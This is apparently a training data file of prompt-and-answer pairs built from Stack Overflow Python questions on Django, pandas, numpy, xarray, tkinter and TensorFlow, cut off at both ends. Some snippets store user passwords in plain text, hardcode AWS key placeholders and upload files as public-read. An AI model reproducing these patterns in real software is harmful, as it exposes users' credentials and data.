models.CharField(max_length=150)\n    profile_email = models.EmailField(max_length=200)\n    profile_create_time = models.DateField(auto_now_add=True)\n    profile_dob = models.DateField()\n    profile_password = models.CharField(max_length=50, null=True)\n    profile_picture = models.ImageField(default='default.jpg', upload_to='profile_pics')\n\n    def __str__(self):\n        return str(self.profile_username)\n<\/code><\/pre>\n<p>My views.py<\/p>\n<pre><code>def signup_form(request):\n    if request.method == 'POST':\n        if request.POST.get('profile_username') and request.POST.get('profile_name') and request.POST.get('profile_email') and request.POST.get('profile_dob') and request.POST.get('profile_password') and request.POST.get('profile_picture'):\n            pr = profile()\n            pr.profile_username = request.POST.get('profile_username')\n            pr.profile_name = request.POST.get('profile_name')\n            pr.profile_email = request.POST.get('profile_email')\n            pr.profile_password = request.POST.get('profile_password')\n            pr.profile_dob = request.POST.get('profile_dob')\n            pr.profile_picture = request.POST.get('profile_picture')\n            try:\n                pr.save()\n                print('setProfile success')\n                return redirect('index.html')\n            except Exception as e:\n                return render(request, 'signup.html')\n            return render(request, 'signup.html') \n    else:\n        return render(request, 'signup.html')\n<\/code><\/pre>\n<p>My Sign up Form 'signup.html'<\/p>\n<pre><code>{% extends 'index.html' %}\n{% block content %}\n\n&lt;form method='POST'&gt;\n    {% csrf_token %}\n    &lt;div&gt;\n        &lt;label&gt;USERNAME&lt;\/label&gt;\n        &lt;input type=&quot;text&quot; placeholder=&quot;&quot; name=&quot;profile_username&quot; required\/&gt;\n    &lt;\/div&gt;&lt;br&gt;\n    &lt;div&gt;\n        &lt;label&gt;NAME&lt;\/label&gt;\n        &lt;input type=&quot;text&quot; placeholder=&quot;&quot; name=&quot;profile_name&quot; required\/&gt;\n    &lt;\/div&gt;&lt;br&gt;\n    &lt;div&gt;\n        &lt;label&gt;EMAIL&lt;\/label&gt;\n        &lt;input type=&quot;email&quot; placeholder=&quot;&quot; name=&quot;profile_email&quot; required\/&gt;\n    &lt;\/div&gt;&lt;br&gt;\n    &lt;div&gt;\n        &lt;label&gt;Password&lt;\/label&gt;\n        &lt;input type=&quot;password&quot; placeholder=&quot;&quot; name=&quot;profile_password&quot; required\/&gt;\n    &lt;\/div&gt;&lt;br&gt;\n    &lt;div&gt;\n        &lt;label&gt;DOB&lt;\/label&gt;\n        &lt;input type=&quot;date&quot; placeholder=&quot;&quot; name=&quot;profile_dob&quot; required\/&gt;\n    &lt;\/div&gt;&lt;br&gt;\n    &lt;div&gt;\n        &lt;label&gt;Profile Picture&lt;\/label&gt;\n        &lt;input type=&quot;file&quot; placeholder=&quot;&quot; name=&quot;profile_picture&quot; required\/&gt;\n    &lt;\/div&gt;&lt;br&gt;\n    &lt;button type=&quot;submit&quot;&gt;submit&lt;\/button&gt;\n&lt;\/form&gt;\n&lt;a href=&quot;\/&quot;&gt;Home&lt;\/a&gt;\n{% endblock content %}\n<\/code><\/pre>\n<p>Also, I want to change the name of the uploaded file, the file which is uploaded by Django admin takes the file name as it is, but when I will expose this app to the public the file name must be proper to avoid overwritten or having the same file multiple times<\/p>","output_text":"<p>Okay, so I got some notion of applying the wrong access keys and taking wrong inputs in views.py<\/p>\n<p><strong>First of all taking correct inputs in views.py<\/strong><\/p>\n<pre><code>pr.profile_picture = request.POST.get('profile_picture')\n<\/code><\/pre>\n<p>instead of using the above, the following would help:<\/p>\n<pre><code>pr.profile_picture  = request.FILES[&quot;profile_picture&quot;]\n<\/code><\/pre>\n<p>also, when I use the above with <em>single inverted commas<\/em> it won't work, so keep that in mind.<\/p>\n<p><strong>Uploading the file to S3<\/strong><\/p>\n<p>Now there will be some other ways to do this but changing the name of the file at the same time.<\/p>\n<p>I made another file specially to handle images and changing the name of the file.<\/p>\n<pre><code>import boto3\n\nsession = boto3.Session(\n    aws_access_key_id= 'secret sauce',\n    aws_secret_access_key = 'secret sauce'\n)\n\nclass image():\n    def UploadImage(name,image):\n        filename = name+'_picture.jpg'\n        imagedata = image\n        s3 = boto3.resource('s3')\n        try:\n            object = s3.Object('bucket sauce', filename)\n            object.put(ACL='public-read',Body=imagedata,Key=filename)\n            return True\n        except Exception as e:\n            return e\n<\/code><\/pre>\n<p>above method is called in views.py<\/p>\n<pre><code>ret = image.UploadImage(pr.profile_username,pr.profile_picture)\n<\/code><\/pre>\n<p>put it in the try block to avoid errors.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Mounted path to CSV-File returns directory, os isfile check returns False<p>When trying to navigate in Databricks to a specfic folder\/file combination using <code>os<\/code>, 2 identical csv's get randomly recognized as <code>file<\/code> or <code>directory<\/code>.\nWhen checking with <code>os.path.isfile()<\/code>, the following returns:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/DG5hZ.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/DG5hZ.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>So far I tried re-loading the data, checking if there were any problems with the specific csv's and can't seem to find a pattern as to which file this error will occur with.\nI tried following advice listed <a href=\"https:\/\/stackoverflow.com\/questions\/52338706\/isadirectoryerror-errno-21-is-a-directory-it-is-a-file\">here<\/a> but the error seems Databricks-specifc.<\/p>","output_text":"<p>One solution I found was reading data using <code>spark<\/code> :<\/p>\n\n<pre><code>  df = sqlContext.read.format('com.databricks.spark.csv') \\\n          .options(header='true', inferSchema='true', sep=';')\\\n          .load(\"\/mnt\/...\/...\/...\/data_2.csv\").toPandas()\n<\/code><\/pre>\n\n<p>This will read the data from the <code>csv<\/code> fine - yet checking with <code>os.path.isfile()<\/code> still doesn't recognize the file as a file.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to deploy custom python packages to Heroku?<p>I am developing a Django app.\nI have modified the source code of <code>daphne<\/code> package for my requirements.\nBut I cant figure out how to use that package in heroku.\nHeroku fetches from official site.\nShould I publish it to pypi as a separate package?\nThanks for the help<\/p>","output_text":"<p>I ended up using the following answer.\nHosting the package in GitHub and accessing it.\n<a href=\"https:\/\/stackoverflow.com\/a\/34518202\/15465995\">https:\/\/stackoverflow.com\/a\/34518202\/15465995<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to deal with NaT\/1970 dates so that python-xarray ds.time.dt.season works?<p>I have this python-xarray dataset:<\/p>\n<pre><code>&lt;xarray.Dataset&gt;\nDimensions:       (airport: 8, profnum: 9993, level: 3)\nCoordinates:\n  * airport       (airport) &lt;U9 'Frankfurt' 'Windhoek' ... 'Madras' 'Hyderabad'\n  * profnum       (profnum) int64 0 1 2 3 4 5 ... 9987 9988 9989 9990 9991 9992\n  * level         (level) int64 0 1 2\n    time          (airport, profnum, level) datetime64[ns] 2008-01-01T10:27:0...\n    yearMonthDay  (airport, profnum, level) object '08-01-01' '08-01-01' ... nan\nData variables:\n    iasi          (airport, profnum, level) float64 0.5094 1.345 ... nan nan\n    IM            (airport, profnum, level) float64 0.515 1.775 ... nan nan\n    IMS           (airport, profnum, level) float64 0.5221 1.514 ... nan nan\n    err           (airport, profnum, level) float64 0.04518 0.2714 ... nan nan\n    std           (airport, profnum, level) float64 0.0324 0.1542 ... nan nan\n    dfs           (airport, profnum, level) float64 1.476 nan nan ... nan nan\n<\/code><\/pre>\n<p>ds.time shows some 1970-01-01 dates that I manage to change to np.datetime64(&quot;NaT&quot;) if needed but ds.time.dt.season don't like them. So I do:<\/p>\n<pre><code>ds = ds.where( (ds.time.dt.year &gt;= 2008) &amp; (ds.time.dt.year &lt;= currentYear), drop=True)\nds = ds.where( (ds.time.dt.year &gt;= 2008) &amp; (ds.time.dt.year &lt;= currentYear), other=np.nan )\n<\/code><\/pre>\n<p>I expect that after this I don't see any 1970 date with ds.time, but replacement does not work.<\/p>\n<p>It looks like &quot;other&quot; expect a float because<\/p>\n<pre><code>ds.where( (ds.time.dt.year &gt;= 2008) &amp; (ds.time.dt.year &lt;= currentYear), other=np.datetime64(&quot;NaT&quot;))\n<\/code><\/pre>\n<p>outputs<\/p>\n<pre><code>TypeError: The DTypes &lt;class 'numpy.dtype[datetime64]'&gt; and &lt;class 'numpy.dtype[float64]'&gt; do not have a common DType. For example they cannot be stored in a single array unless the dtype is `object`.\n<\/code><\/pre>\n<p>Which is strange since df.time is datetime64.<\/p>\n<p>Thank you<\/p>","output_text":"<p>The statement<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>ds.where(\n    (ds.time.dt.year &gt;= 2008) &amp; (ds.time.dt.year &lt;= currentYear),\n    other=np.datetime64(&quot;NaT&quot;),\n)\n<\/code><\/pre>\n<p>can be interpreted as<\/p>\n<blockquote>\n<p>wherever 2008 \u2264 year \u2264 currentYear, return ds, otherwise return <code>NaT<\/code><\/p>\n<\/blockquote>\n<p>This causes problems because this operation is carried out for each <em>variable<\/em> in your dataset. Because all of your data_variables are type <code>float64<\/code>, you are recieving this error. To only replace values in time, limit your condition to <code>ds.time<\/code>:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>ds.time.where(\n    (ds.time.dt.year &gt;= 2008) &amp; (ds.time.dt.year &lt;= currentYear),\n    other=np.datetime64(&quot;NaT&quot;),\n)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Replace a specific word with the value from another column<p>I've the following dataframe:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/GiTUO.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/GiTUO.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>What I am trying to do is to add the vlaue from Col_1 after the word \"Draft\".<\/p>\n\n<p>Basically, I need the following output:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/TgMmE.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/TgMmE.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>For that I am trying with the following code:<\/p>\n\n<pre><code>df['Col_3'] = df['Col_2'].str.replace(r'Draft', ' Draft' + df['Col_1'].astype(str), regex=True)\n<\/code><\/pre>\n\n<p>But it gives me the following error:<\/p>\n\n<pre><code> raise TypeError(\"repl must be a string or callable\")\nTypeError: repl must be a string or callable\n<\/code><\/pre>\n\n<p>How can I do this?<\/p>\n\n<p>Thanks!<\/p>","output_text":"<pre><code>df['Col3'] = df.apply(lambda x: x['Col2'].replace(\"Draft\", \"Draft {}\".format(x['Col1'])), axis=1)\n<\/code><\/pre>\n\n<p>or using <code>fstrings<\/code><\/p>\n\n<pre><code>df = pd.DataFrame(\n    {\n        \"val\": [\"AAA\", \"BBB\"],\n        \"str\": [\n            \"Draft I promise not to use pictures in my next question\",\n            \"Draft jk ill most likely post more pics\"]})\n\n\ndf[\"output\"] = df[[\"str\", \"val\"]].apply(\n    lambda x: x[\"str\"].replace(\"Draft\", f\"Draft {x['val']} \"), axis=1\n)\n\nprint(df['output'])\n\n0    Draft AAA  I promise not to use pictures in my...\n1         Draft BBB  jk ill most likely post more pics\nName: output, dtype: object\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Generating indices of a 2D NumPy array<p>I want to generate a 2D <code>numpy<\/code> array with elements calculated from their positions. Something like the following code:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import numpy as np\n\ndef calculate_element(i, j, other_parameters):\n    # do something\n    return value_at_i_j\n\ndef main():\n    arr = np.zeros((M, N))  # (M, N) is the shape of the array\n    for i in range(M):\n        for j in range(N):\n            arr[i][j] = calculate_element(i, j, ...)\n<\/code><\/pre>\n<p>This code runs extremely slow since the loops in Python are just not very efficient. Is there any way to do this faster in this case?<\/p>\n<p>By the way, for now I use a workaround by calculating two 2D &quot;index matrices&quot;. Something like this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def main():\n    index_matrix_i = np.array([range(M)] * N).T\n    index_matrix_j = np.array([range(N)] * M)\n\n    '''\n    index_matrix_i is like\n    [[0,0,0,...],\n     [1,1,1,...],\n     [2,2,2,...],\n     ...\n    ]\n\n    index_matrix_j is like\n    [[0,1,2,...],\n     [0,1,2,...],\n     [0,1,2,...],\n     ...\n    ]\n    '''\n\n    arr = calculate_element(index_matrix_i, index_matrix_j, ...)\n<\/code><\/pre>\n<p>Edit1: The code becomes much faster after I apply the &quot;index matrices&quot; trick, so the main question I want to ask is that if there is a way to <strong>not<\/strong> use this trick, since it takes more memory. In short, I want to have a solution that is <strong>efficient in both time and space<\/strong>.<\/p>\n<p>Edit2: Some examples I tested<\/p>\n<pre class=\"lang-py prettyprint-override\"><code># a simple 2D Gaussian\ndef calculate_element(i, j, i_mid, j_mid, i_sig, j_sig):\n    gaus_i = np.exp(-((i - i_mid)**2) \/ (2 * i_sig**2))\n    gaus_j = np.exp(-((j - j_mid)**2) \/ (2 * j_sig**2))\n    return gaus_i * gaus_j\n<\/code><\/pre>\n<pre class=\"lang-py prettyprint-override\"><code># size of M, N\nM, N = 1200, 4000\n<\/code><\/pre>\n<pre class=\"lang-py prettyprint-override\"><code># use for loops to go through every element\n# this code takes ~10 seconds\ndef main_1():\n    arr = np.zeros((M, N))  # (M, N) is the shape of the array\n    for i in range(M):\n        for j in range(N):\n            arr[i][j] = calculate_element(i, j, 600, 2000, 300, 500)\n    # print(arr)\n    plt.figure(figsize=(8, 5))\n    plt.imshow(arr, aspect='auto', origin='lower')\n    plt.show()\n<\/code><\/pre>\n<pre class=\"lang-py prettyprint-override\"><code># use index matrices\n# this code takes &lt;1 second\ndef main_2():\n    index_matrix_i = np.array([range(M)] * N).T\n    index_matrix_j = np.array([range(N)] * M)\n    arr = calculate_element(index_matrix_i, index_matrix_j, 600, 2000, 300, 500)\n\n    # print(arr)\n    plt.figure(figsize=(8, 5))\n    plt.imshow(arr, aspect='auto', origin='lower')\n    plt.show()\n<\/code><\/pre>","output_text":"<p>You can use <a href=\"https:\/\/numpy.org\/doc\/stable\/reference\/generated\/numpy.indices.html\" rel=\"nofollow noreferrer\"><code>np.indices()<\/code><\/a> to generate the desired output:<\/p>\n<p>For example,<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>np.indices((3, 4))\n<\/code><\/pre>\n<p>outputs:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>[[[0 0 0 0]\n  [1 1 1 1]\n  [2 2 2 2]]\n\n [[0 1 2 3]\n  [0 1 2 3]\n  [0 1 2 3]]]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to apply cummulative sum in Numpy in slices with condition to previous value?<p>I have a vector with signals with values of <code>1<\/code> or <code>-1<\/code>. I want to have a second vector that computes the cumulative sum of consecutive signals with the same value and restarts the cumulative sum every time the signal change. Here is an example:<\/p>\n<pre><code>signal  = [1  1  1 -1 -1 -1 -1]\n\ncum_sum = [1  2  3 -1 -2 -3 -4]\n<\/code><\/pre>\n<p>I have large data to be computed and want to do it as efficiently as possible.\nMy code right now does the job but it takes time and is not taking advantage of numpy efficiency:<\/p>\n<pre><code>import numpy as np\n\n# Signal values to be analyzed\nsignal = np.array([1,1,1,-1,-1,-1,-1], dtype=int)\n\n# Vector with previous value of signal\nsignal_prev = signal[:-1]\nsignal_prev = np.pad(signal_prev,(1,0), mode='constant', constant_values=(0))\n\n#Array with signal values in first column and previous values in second column \narr = np.array([signal,signal_prev], dtype=int)\narr = np.transpose(arr)\n\nprint(arr)\n&quot;&quot;&quot; Array with signal values and previous values\n[[ 1  0]\n [ 1  1]\n [ 1  1]\n [-1  1]\n [-1 -1]\n [-1 -1]\n [-1 -1]]\n&quot;&quot;&quot;\n\n#create an empty array to append cumulative sum\nsignal_sum = np.array([], dtype=int)\n\n# compute the cumulative sum iterating row by row\nfor x in arr:\n    if np.sign(x[0]*x[1]) &gt; 0:\n        signal_sum = np.append(signal_sum, signal_sum[-1] + x[1])\n    else:\n        signal_sum= np.append(signal_sum, x[0])\n\narr_sum = np.array([signal, signal_sum])\narr_sum = np.transpose(arr_sum)\nprint(arr_sum)\n&quot;&quot;&quot; Array with signal values and cumulative sum restarted with signal change\n[[ 1  1]\n [ 1  2]\n [ 1  3]\n [-1 -1]\n [-1 -2]\n [-1 -3]\n [-1 -4]]\n&quot;&quot;&quot;\n<\/code><\/pre>\n<p>I believe that this calculation can be done more efficiently using numpy functions or using lambda functions. I'm not a programmer, and I'm new to Python. I would like to know if this could be done faster.<\/p>","output_text":"<p>For a <em>fast<\/em>, fully vectorized way (no loops), you can use a regular <code>np.cumsum()<\/code>, but on a copy of your array where you subtract the previous group sum at the start of each group:<\/p>\n<pre><code>def group_cumsum(s):\n    # make a copy and ensure np.array (in case list was given)\n    s = np.array(s).copy()\n    idx = np.nonzero(np.diff(s))[0]  # last of each group\n    off = np.diff(np.concatenate(([0], np.cumsum(s)[idx])))\n    s[idx + 1] -= off\n    return np.cumsum(s)\n<\/code><\/pre>\n<p>Example:<\/p>\n<pre><code>print(group_cumsum([1, 1, 1, -1, -1, -1, -1]))\n# [ 1  2  3 -1 -2 -3 -4]\n\nprint(group_cumsum([1]*3 + [-1]*2 + [1]*4 + [-1]*5))\n# [ 1  2  3 -1 -2  1  2  3  4 -1 -2 -3 -4 -5]\n<\/code><\/pre>\n<p><strong>The time saving is substantial<\/strong> for large arrays:<\/p>\n<ol>\n<li>no loops in the Python code, all ops are vectorized, and<\/li>\n<li>it is <code>O(n + k)<\/code> for <code>k<\/code> groups in an array of size <code>n<\/code> (unlike other solutions that are <code>O(n * k)<\/code>).<\/li>\n<\/ol>\n<p>Try this:<\/p>\n<pre><code>s = np.random.choice([1, -1], size=(int(1e6)))\n\n%%timeit\ngroup_cumsum(s)\n\n19.1 ms \u00b1 137 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 100 loops each)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n I cant use event in fuctions in tkinter<p>I am trying to make a calculator with the help of tkinter. I have defined a function click, which returns the value the user clicked but it is giving a error which I am not understanding.<\/p>\n<pre><code>Exception in Tkinter callback\nTraceback (most recent call last):\n  File &quot;C:\\Python39\\lib\\tkinter\\__init__.py&quot;, line 1892, in __call__\n    return self.func(*args)\nTypeError: click() missing 1 required positional argument: 'event'\n<\/code><\/pre>\n<p>My code is as follows:<\/p>\n<pre><code>from tkinter import *\n\ndef click(event):\n    text = event.widget.cget(&quot;text&quot;)\n\nicon = r&quot;C:\\Users\\Sumit\\vs code python\\projects\\tkinter_course\\calculator.ico&quot;\nroot = Tk()\nroot.configure(bg = &quot;black&quot;)\n\nroot.geometry(&quot;644x500&quot;)\nroot.title(&quot;Calculator by Arnav&quot;)\nroot.wm_iconbitmap(icon)\n\nscvalue = StringVar()\nscvalue.set(&quot;&quot;)\nscreen = Entry(root, textvar=scvalue, font=&quot;lucida 37 bold&quot;)\nscreen.pack(fill=X, ipadx=8, pady=10, padx=12)\n    \nf1 = Frame(root, bg = 'white' ).pack(side = LEFT)\n\nb1 = Button(f1 , text = &quot;1&quot;, font = 'lucida 35 bold',command=click).pack(anchor = 'nw',side = \nLEFT, padx = 23)\n\n\nb2 = Button(f1 , text = &quot;2&quot;, font = 'lucida 35 bold',command=click).pack(anchor = 'nw',side = \nLEFT, padx = 23)\n\n\nb3 = Button(f1 , text = &quot;3&quot;, font = 'lucida 35 bold',command=click).pack(anchor = 'nw',side = \nLEFT, padx = 23)\n\nroot.mainloop()\n<\/code><\/pre>\n<p>It is telling that I have not defined event, but I have.\nPls help.<\/p>","output_text":"<p>You need to bind your function to the widget you want to detect with this line of code...<\/p>\n<pre><code>&lt;Button-Variable-Name-Here&gt;.bind(&quot;&lt;Button-1&gt;&quot;, click)\n<\/code><\/pre>\n<p>This will then check if the widget is ever clicked with the left mouse button.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n why django not found module psycopg2 in django2.2 and python 3.8<p>I install django 2.2.10 and python 3.8 and psycopg2 2.8.4 but when i try migration with command (python manage.py migrate) confront this error:<\/p>\n\n<p>raise ImproperlyConfigured(\"Error loading psycopg2 module: %s\" % e)\ndjango.core.exceptions.ImproperlyConfigured: Error loading psycopg2 module: No module named 'psycopg2'<\/p>\n\n<p>psycopg2 in 32-bit. i try any solution that available in stackoverflow but this error don't dissolve<\/p>\n\n<p>databases in settings.py:<\/p>\n\n<pre><code>DATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.postgresql_psycopg2',\n        'NAME': 'postgres',\n        'USER': 'seyyedh',\n        'PASSWORD' : '123456',\n        'HOST':'localhost',\n        'PORT' : '5432',\n    }\n}\n<\/code><\/pre>","output_text":"<p>I understand that psycopg2 installed on another virtual env while main virtual env running \nso I unistalled that virtual env and error solved<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n regex expression extract string after last comma with no numbers<p>Given a dataframe <code>A<\/code> that looks like this:<\/p>\n<div class=\"s-table-container\">\n<table class=\"s-table\">\n<thead>\n<tr>\n<th>id<\/th>\n<th>information<\/th>\n<\/tr>\n<\/thead>\n<tbody>\n<tr>\n<td>001<\/td>\n<td>Yellow, in town, John<\/td>\n<\/tr>\n<tr>\n<td>002<\/td>\n<td>Green, home, Lia 33<\/td>\n<\/tr>\n<tr>\n<td>003<\/td>\n<td>Yellow, garden, Peter2543<\/td>\n<\/tr>\n<tr>\n<td>004<\/td>\n<td>Red, 23 garden, 004 John891<\/td>\n<\/tr>\n<tr>\n<td>005<\/td>\n<td>Red, home, 245Sarah<\/td>\n<\/tr>\n<tr>\n<td>006<\/td>\n<td>Red 2, park 28, 67 Luke<\/td>\n<\/tr>\n<tr>\n<td>007<\/td>\n<td>Purple 03, to the beach, Mary Rose 9855<\/td>\n<\/tr>\n<tr>\n<td>...<\/td>\n<td>...<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n<\/div>\n<p>I want to create a new column called <code>name<\/code> by extracting the name from <code>information<\/code>, without numbers. That is:<\/p>\n<div class=\"s-table-container\">\n<table class=\"s-table\">\n<thead>\n<tr>\n<th>id<\/th>\n<th>information<\/th>\n<th>name<\/th>\n<\/tr>\n<\/thead>\n<tbody>\n<tr>\n<td>001<\/td>\n<td>Yellow, in town, John<\/td>\n<td>John<\/td>\n<\/tr>\n<tr>\n<td>002<\/td>\n<td>Green, wardrobe, home, Lia 33<\/td>\n<td>Lia<\/td>\n<\/tr>\n<tr>\n<td>003<\/td>\n<td>Yellow, garden, Peter2543<\/td>\n<td>Peter<\/td>\n<\/tr>\n<tr>\n<td>004<\/td>\n<td>Red, 23 garden, 004 John891<\/td>\n<td>John<\/td>\n<\/tr>\n<tr>\n<td>005<\/td>\n<td>Red, hat, home, 245Sarah<\/td>\n<td>Sarah<\/td>\n<\/tr>\n<tr>\n<td>006<\/td>\n<td>Red 2, park 28, 67 Luke<\/td>\n<td>Luke<\/td>\n<\/tr>\n<tr>\n<td>007<\/td>\n<td>Purple 03, to the beach, Mary Rose 9855<\/td>\n<td>Mary Rose<\/td>\n<\/tr>\n<tr>\n<td>...<\/td>\n<td>...<\/td>\n<td>...<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n<\/div>\n<p>Notice that:<\/p>\n<ul>\n<li>the name in <code>information<\/code> is always after the last comma<\/li>\n<li>the name may have numbers after and\/or before the name<\/li>\n<li>these numbers can be separated by a white space or not<\/li>\n<li>the name can be two words (i.e. <em>Mary Rose<\/em>)<\/li>\n<\/ul>\n<p>If I do:<\/p>\n<pre><code>A['name'] = A['information'].apply(lambda x: x.rsplit(',', 1)[1] if ',' in x else x)\n<\/code><\/pre>\n<p>it returns everything after the last comma (i.e: <em>John<\/em>, <em>Lia 33<\/em>, <em>Peter 2543<\/em>,...). But I need to only get the name.<\/p>\n<p>I guess I have to use <code>re.split()<\/code> instead but I cannot figure out which should be the regex expression...<\/p>","output_text":"<p>You can use<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import pandas as pd\ndf = pd.DataFrame({&quot;information&quot;:[&quot;Yellow, in town, John&quot;,&quot;Green, home, Lia 33&quot;,&quot;Yellow, garden, Peter2543&quot;,&quot;Red, 23 garden, 004 John891&quot;,&quot;Red, home, 245Sarah&quot;,&quot;Red 2, park 28, 67 Luke&quot;,&quot;Purple 03, to the beach, Mary Rose 9855&quot;]})\ndf['name'] = df['information'].str.extract(r'.*,\\s*(?:\\d+\\s*)?([^\\d,]+?)(?:\\s*\\d+)?$', expand=False)\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; df['information'].str.extract(r'.*,\\s*(?:\\d+\\s*)?([^\\d,]+?)(?:\\s*\\d+)?$', expand=False)\n0         John\n1          Lia\n2        Peter\n3         John\n4        Sarah\n5         Luke\n6    Mary Rose\nName: information, dtype: object\n<\/code><\/pre>\n<p><em>Details<\/em>:<\/p>\n<ul>\n<li><code>.*,<\/code> - any zero or more chars other than line break chars as many as possible, and then a <code>,<\/code> char<\/li>\n<li><code>\\s*<\/code> - zero or more whitespaces<\/li>\n<li><code>(?:\\d+\\s*)?<\/code> - an optional sequence of one or more digits and then zero or more whitespaces<\/li>\n<li><code>([^\\d,]+?)<\/code> - Group 1: one or more chars other than digits and comma, as few as possible<\/li>\n<li><code>(?:\\s*\\d+)?<\/code> - an optional sequence of zero or more whitespaces and then one or more digits<\/li>\n<li><code>$<\/code> - end of string.<\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to define positive integer field that accepts 6 digits only in Django?<p>I want to define a database field in <code>models.py<\/code> that accepts only 6 digits in Django.<\/p>\n<p>This is how I define the field in <code>models.py<\/code> but it can accept any positive integer;<\/p>\n<pre><code>six_digit_code = models.PositiveIntegerField(blank=False)\n<\/code><\/pre>\n<p>I am using Django v4.<\/p>","output_text":"<p>You should use validators for it:<\/p>\n<pre><code>six_digit_code = models.PositiveIntegerField(validators=[MinValueValidator(100000), MaxValueValidator(999999)])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n InvalidArguementError: Cannot add tensor to the batch: number of elements does not match<p>I have a csv file which looks liks this:\n<a href=\"https:\/\/i.stack.imgur.com\/So10I.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/So10I.png\" alt=\"Dataframe\" \/><\/a><\/p>\n<p>I want to load the image (from <code>df['Image_location']<\/code>) and text (from <code>df['Content']<\/code>) together, so I did the following operations:<\/p>\n<pre><code>df = pd.read_csv(csv_data_dir, encoding= 'cp1252')\nfeatures = df[['Content', 'Image_location']]\nlabels = df['Sentiment']\ndataset = tf.data.Dataset.from_tensor_slices((features, labels))\n\ndef process_path(x):\n  content, image_path = x[0],  x[1]\n  print(image_path)\n  img = tf.io.read_file(image_path)\n  img = tf.io.decode_jpeg(img, channels=3)\n  return content, img\n\ndataset = dataset.map(lambda x, y: (process_path(x), y))\n\ndataset = dataset.batch(32, drop_remainder = True)\n<\/code><\/pre>\n<p>Upon running the training loop:<\/p>\n<pre><code>for step , (x, y) in enumerate(dataset):\n  print(f&quot;Step:{step}&quot;)\n<\/code><\/pre>\n<pre><code>InvalidArgumentError                      Traceback (most recent call last)\n~\\AppData\\Local\\Temp\/ipykernel_19112\/3450653832.py in &lt;module&gt;\n      1 import matplotlib.pyplot as plt\n----&gt; 2 for step , (x, y) in enumerate(dataset):\n      3   print(f&quot;Step:{step}&quot;)\n      4   content = x[0]\n      5   image = x[1]\n\n~\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\tensorflow\\python\\data\\ops\\iterator_ops.py in __next__(self)\n    798   def __next__(self):\n    799     try:\n--&gt; 800       return self._next_internal()\n    801     except errors.OutOfRangeError:\n    802       raise StopIteration\n\n~\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\tensorflow\\python\\data\\ops\\iterator_ops.py in _next_internal(self)\n    781     # to communicate that there is no more data to iterate over.\n    782     with context.execution_mode(context.SYNC):\n--&gt; 783       ret = gen_dataset_ops.iterator_get_next(\n    784           self._iterator_resource,\n    785           output_types=self._flat_output_types,\n\n~\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\tensorflow\\python\\ops\\gen_dataset_ops.py in iterator_get_next(iterator, output_types, output_shapes, name)\n   2842       return _result\n   2843     except _core._NotOkStatusException as e:\n-&gt; 2844       _ops.raise_from_not_ok_status(e, name)\n   2845     except _core._FallbackException:\n   2846       pass\n\n~\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\tensorflow\\python\\framework\\ops.py in raise_from_not_ok_status(e, name)\n   7105 def raise_from_not_ok_status(e, name):\n   7106   e.message += (&quot; name: &quot; + name if name is not None else &quot;&quot;)\n-&gt; 7107   raise core._status_to_exception(e) from None  # pylint: disable=protected-access\n   7108 \n   7109 \n\nInvalidArgumentError: Cannot add tensor to the batch: number of elements does not match. Shapes are: [tensor]: [344,500,3], [batch]: [500,333,3] [Op:IteratorGetNext]\n<\/code><\/pre>\n<p>Any idea where I'm going wrong or how to batch this dataset properly as without <code>dataset = dataset.batch(32, drop_remainder = True)<\/code>, the code works 